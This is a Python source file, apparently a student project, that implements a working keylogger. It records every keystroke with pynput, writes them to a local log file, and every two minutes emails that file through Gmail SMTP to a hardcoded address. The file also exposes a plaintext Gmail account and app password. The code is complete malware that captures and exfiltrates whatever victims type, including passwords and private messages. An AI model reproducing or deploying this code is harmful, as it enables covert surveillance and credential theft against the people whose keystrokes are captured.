import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from pynput.keyboard import Listener
import time

sender_email = "mattbootconp4@gmail.com"
sender_password = "opea wzdl auid xmro"
receiver_email = "mattbootconp4@gmail.com"
subject = "Keylogs"

attachment_path=r"C:\Users\13126\OneDrive\Desktop\Project 4\Keylogs.txt"

MAX_KEYSTROKES_PER_EMAIL = 50
BUFFER_TIME_MINUTES = 2

Keystrokes_buffer = []
last_send_time = 0

def log_keystroke(key):
    global last_send_time
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = '_'
    if key == 'Key.shift_l':
        key = "_"
    if key == "Key.enter":
        key = '\n'

    with open ("Keylogs.txt", 'a') as f:
        f.write(key) 
        f.flush()
        print(f"Logged keystroke: {key}")

    if time.time() - last_send_time > BUFFER_TIME_MINUTES * 60:
        send_email(sender_email, sender_password, receiver_email, subject, "Keylogs.txt")
        last_send_time = time.time()
        print("sending email")

def send_email(sender, password, receiver, subject, attachment_path):
    message = MIMEMultipart()
    message['From'] = sender
    message['To'] = receiver
    message['Subject'] = subject

    body = "Here's what the keylogger turned up."
    message.attach(MIMEText(body, 'plain'))

    with open(attachment_path, 'rb') as attachments:
        part = MIMEApplication(attachments.read(), Name="Keylogs.txt")

    part['Content-Disposition'] = f'attachment; filename="Keylogs.txt"'    
    message.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()

    server.login(sender,password)

    server.sendmail(sender, receiver, message.as_string())

    server.quit()

with Listener(on_press=log_keystroke) as l:
    l.join()                   